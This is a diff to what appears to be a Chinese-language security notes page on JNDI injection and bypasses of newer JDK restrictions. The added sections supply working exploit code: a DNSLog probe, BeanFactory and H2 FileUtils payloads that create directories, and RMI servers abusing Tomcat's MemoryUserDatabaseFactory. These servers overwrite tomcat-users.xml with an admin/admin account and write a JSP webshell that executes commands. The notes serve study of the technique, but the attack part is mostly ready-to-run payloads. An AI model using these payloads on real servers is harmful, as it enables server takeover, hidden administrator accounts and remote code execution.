@@ -214,6 +214,23 @@ javaCodebase 属性可以指定远程的URL，攻击者可以通过JNDI Referenc
 
 JNDI 注入可以利用 RMI 协议和LDAP 协议搭建服务然后执行命令，但缺点在于，没有确定存在漏洞前，使用 RMI 或者 LDAP 去执行命令，服务器通过日志可分析得到攻击者的 IP。为了解决这个问题，可以使用DNS 协议进行探测，通过 DNS 协议去探测是否真的存在漏洞，再去利用 RMI 或者 LDAP 去执行命令，避免过早暴露服务器 IP，这也是平常大多数人习惯使用 DNSLog 探测的原因之一，同样的 ldap 和 rmi 也可以使用 DNSLog 平台去探测。
 
+??? note "code"
+
+    ```java
+    import javax.naming.InitialContext;
+    import javax.naming.NamingException;
+
+
+    public class LDAPClient {
+        public static void main(String[] args) throws NamingException{
+            String url = "dns://192rzl.dnslog.cn";
+            InitialContext initialContext = new InitialContext();
+            initialContext.lookup(url);
+        }
+
+    }
+    ```
+
 ## JNDI 绕过
 
 高版本JDK在RMI和LDAP的trustURLCodebase都做了限制，从默认允许远程加载ObjectFactory变成了不允许。对于Oracle JDK 11.0.1、8u191、7u201、6u211或者更高版本的JDK来说，默认环境下之前这些利用方式都已经失效。然而，我们依然可以进行绕过并完成利用。两种绕过方法如下：
@@ -326,7 +343,7 @@ JNDI 注入可以利用 RMI 协议和LDAP 协议搭建服务然后执行命令�
 
 根据源代码的逻辑，在ldap或rmi服务器，满足以下条件的RefAddr
 
-- 该类必须有无参构造方法
+- 该类必须有public无参构造方法
 - 并在其中设置一个forceString字段指定某个特殊方法名，该方法执行String类型的参数
 - 通过上面的方法和一个String参数即可实现RCE
 
@@ -399,7 +416,7 @@ public class RMIServer {
 
 高版本JVM对Reference Factory远程加载类进行了安全限制，JVM不会信任LDAP对象反序列化过程中加载的远程类，但攻击者仍然可以利用受害者本地CLASSPATH中存在漏洞的反序列化Gadget达到绕过限制执行命令的目的。
 
-简而言之，LDAP Server除了使用JNDI Reference进行利用之外，还支持直接返回一个对象的序列化数据。如果Java对象的 javaSerializedData 属性值不为空，则客户端的 obj.decodeObject() 方法就会对这个字段的内容进行反序列化。
+简而言之，LDAP Server除了使用JNDI Reference进行利用之外，还支持直接返回一个对象的序列化数据。如果Java对象的 javaSerializedData 属性值不为空，则客户端的 `obj.decodeObject()` 方法就会对这个字段的内容进行反序列化。
 
 例如目标系统中存在 CommonsCollections 库，我们就可以使用ysoserial进行反序列化攻击
 
@@ -464,8 +481,6 @@ MLet可以通过报错信息来检测本地环境是否存在某些类可以加�
         return ref;
     }
     ```
-
-[JNDI 注入利用工具](https://github.com/X1r0z/JNDIMap)
 
 #### GroovyClassLoader
 
@@ -593,9 +608,187 @@ MVEL的入口`org.mvel2.MVEL#eval(String)`因为无参构造方法是private修�
     }
     ```
 
+#### NativeLibLoader
+
+`com.sun.glass.utils.NativeLibLoader`是JDK的类，它有一个loadLibrary(String)方法。
+
+它会去加载指定路径的动态链接库文件，所以只要能够通过WEB功能或者写文件gadget上传一个动态链接库就可以用`com.sun.glass.utils.NativeLibLoader`来加载并执行命令。
+
+### 基于 MemoryUserDatabaseFactory
+
+扫描发现`org.apache.catalina.users.MemoryUserDatabaseFactory`这个类也存在利用的可能
+
+![alt text](img/3.png)
+
+这里会先实例化一个MemoryUserDatabase对象，从 Reference 中取出参数并调用 setter 方法赋值。
+
+赋值完成会先调用open()方法，如果readonly=false那就会调用save()方法。
+
+#### XXE
+
+open方法会根据pathname去发起本地或者远程文件访问，并使用 commons-digester 解析返回的 XML 内容，此处可以利用 XXE 漏洞进行攻击。
+
+<figure markdown="span">
+![](img/4.png){width=90% loading=lazy}
+<figcaption>open方法</figcaption>
+</figure>
+
+#### RCE
+
+进入 save()方法的主需要先经过 `isWriteable()==true` 的判断。
+
+![alt text](img/5.png)
+
+pathname是一个URL，catelina_base=`/path/to/tomcat/`
+
+若pathname=`http://127.0.0.1:8888/../../conf/tomcat-users.xml`
+
+则拼装的文件路径为`/path/to/tomcat/http:/127.0.0.1:8888/../../conf/tomcat-users.xml`
+
+该路径在Windows下可以直接判定成功。但linux下必须要求目录跳转前的路径必须存在，需要在tomcat目录下创建`http:/127.0.0.1:8888/`目录。
+
+可以采用`org.h2.store.fs.FileUtils#createDirectory(String)`结合BeanFactory进行创建，其代码如下：
+
+```java
+private static ResourceRef tomcatMkdirFrist() {
+    ResourceRef ref = new ResourceRef("org.h2.store.fs.FileUtils", null, "", "",
+            true, "org.apache.naming.factory.BeanFactory", null);
+    ref.add(new StringRefAddr("forceString", "a=createDirectory"));
+    ref.add(new StringRefAddr("a", "../http:"));
+    return ref;
+}
+private static ResourceRef tomcatMkdirLast() {
+    ResourceRef ref = new ResourceRef("org.h2.store.fs.FileUtils", null, "", "",
+            true, "org.apache.naming.factory.BeanFactory", null);
+    ref.add(new StringRefAddr("forceString", "a=createDirectory"));
+    ref.add(new StringRefAddr("a", "../http:/127.0.0.1:8888"));
+    return ref;
+}
+```
+
+因为要在 CATALINA.BASE创建目录，所以需要从工作目录CATALINA.BASE/bin 向上跳一级，分别执行 tomcatMkdirFrist 和 tomcatMkdirLast ，这样 CATALINA.BASE目录下就会创建出一个 `http:`目录和它的子目录`127.0.0.1:8888`。
+
+经过save方法校验进入后：
+
+![alt text](img/6.png)
+
+前面的 open 方法中有如下代码：
+
+```java
+digester.addFactoryCreate("tomcat-users/group", new MemoryGroupCreationFactory(this), true);
+digester.addFactoryCreate("tomcat-users/role", new MemoryRoleCreationFactory(this), true);
+digester.addFactoryCreate("tomcat-users/user", new MemoryUserCreationFactory(this), true);
+```
+
+save 将从pathname下载的xml文件中的roles、groups和users写入文件中，并覆盖给Catalina.base+pathname的文件中。
+
+
+RCE的方法有两种，分别是覆盖 tomcat-users.xml 和写 webshell 
+
+=== "创建 tomcat 管理员"
+
+    ```java title="RMIServer"
+    import com.sun.jndi.rmi.registry.ReferenceWrapper;
+    import org.apache.naming.ResourceRef;
+
+    import javax.naming.StringRefAddr;
+    import java.rmi.registry.LocateRegistry;
+    import java.rmi.registry.Registry;
+    public class UserDataRCE_Server {
+        public static void main(String[] args) throws Exception{
+
+            Registry registry = LocateRegistry.createRegistry(1099);
+
+            // ===============================1 创建http:/================================================
+            // ResourceRef ref = new ResourceRef("org.h2.store.fs.FileUtils", null, "", "",
+            //         true, "org.apache.naming.factory.BeanFactory", null);
+            // ref.add(new StringRefAddr("forceString", "a=createDirectory"));
+            // ref.add(new StringRefAddr("a", "../http:"));
+
+            // ===============================2 创建http:/127.0.0.1:8888/================================================
+        // ResourceRef ref = new ResourceRef("org.h2.store.fs.FileUtils", null, "", "",
+        //         true, "org.apache.naming.factory.BeanFactory", null);
+        // ref.add(new StringRefAddr("forceString", "a=createDirectory"));
+        // ref.add(new StringRefAddr("a", "../http:/127.0.0.1:8888"));
+
+            // ===============================3 写入文件================================================
+
+        ResourceRef ref = new ResourceRef("org.apache.catalina.UserDatabase", null, "", "",
+                true, "org.apache.catalina.users.MemoryUserDatabaseFactory", null);
+        ref.add(new StringRefAddr("pathname", "http://127.0.0.1:8888/../../conf/tomcat-users.xml"));
+        ref.add(new StringRefAddr("readonly", "false"));
+            // ===============================写入文件================================================
+
+            ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);
+            registry.bind("writeFile", referenceWrapper);
+        }
+    }
+    ```
+
+    ```xml title="tomcat-users.xml"
+    <?xml version="1.0" encoding="UTF-8"?>
+    <tomcat-users xmlns="http://tomcat.apache.org/xml"
+                xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+                xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
+                version="1.0">
+
+    <role rolename="manager-gui"/>
+    <role rolename="manager-script"/>
+    <role rolename="manager-jmx"/>
+    <role rolename="manager-status"/>
+    <role rolename="admin-gui"/>
+    <role rolename="admin-script"/>
+
+    <user username="admin" password="admin" roles="manager-gui,manager-script,manager-jmx,manager-status,admin-gui,admin-script"/>
+    </tomcat-users>
+    ```
+
+=== "Webshell"
+
+    ```java title="RMIServer"
+    import com.sun.jndi.rmi.registry.ReferenceWrapper;
+    import org.apache.naming.ResourceRef;
+
+    import javax.naming.StringRefAddr;
+    import java.rmi.registry.LocateRegistry;
+    import java.rmi.registry.Registry;
+    public class UserDataRCE_Server {
+        public static void main(String[] args) throws Exception{
+
+            Registry registry = LocateRegistry.createRegistry(1099);
+
+            // ===============================写入webshell文件================================================
+            ResourceRef ref = new ResourceRef("org.apache.catalina.UserDatabase", null, "", "",
+                    true, "org.apache.catalina.users.MemoryUserDatabaseFactory", null);
+            ref.add(new StringRefAddr("pathname", "http://127.0.0.1:8888/../../webapps/ROOT/test.jsp"));
+            ref.add(new StringRefAddr("readonly", "false"));
+
+            ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);
+            registry.bind("writeFile", referenceWrapper);
+        }
+    }
+    ```
+
+    ```xml title="test.jsp"
+    <?xml version="1.0" encoding="UTF-8"?>
+    <tomcat-users xmlns="http://tomcat.apache.org/xml"
+                xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+                xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
+                version="1.0">
+    <role rolename="&#x3c;%Runtime.getRuntime().exec(&#x22;calc&#x22;); %&#x3e;"/>
+    </tomcat-users>
+    ```
+
+###  JDBC RCE
+ObjectFactory 的实现类里有好几个类都是用来实例化数据源的，如果能够触发数据库连接，那就可以用 jdbc 来 RCE。参考[《Make JDBC Attacks Brilliant Again》](https://conference.hitb.org/hitbsecconf2021sin/sessions/make-jdbc-attacks-brilliant-again/){target=_blank}根据classpath下有哪些可用的jdbc驱动构造出对应的 payload。
+
+[Todo](/todo)
 
 ## 参考资料
 
-[如何绕过高版本 JDK 的限制进行 JNDI 注入利用](https://paper.seebug.org/942/){target="_blank"}
-[java高版本下各种JNDI Bypass方法复现](https://www.cnblogs.com/bitterz/p/15946406.html){target="_blank"}
-[探索高版本 JDK 下 JNDI 漏洞的利用方法](https://tttang.com/archive/1405/){target="_blank"}
+- [如何绕过高版本 JDK 的限制进行 JNDI 注入利用](https://paper.seebug.org/942/){target="_blank"}
+- [java高版本下各种JNDI Bypass方法复现](https://www.cnblogs.com/bitterz/p/15946406.html){target="_blank"}
+- [探索高版本 JDK 下 JNDI 漏洞的利用方法](https://tttang.com/archive/1405/){target="_blank"}
+
+
+[JNDI 注入利用工具](https://github.com/X1r0z/JNDIMap){target="_blank"}
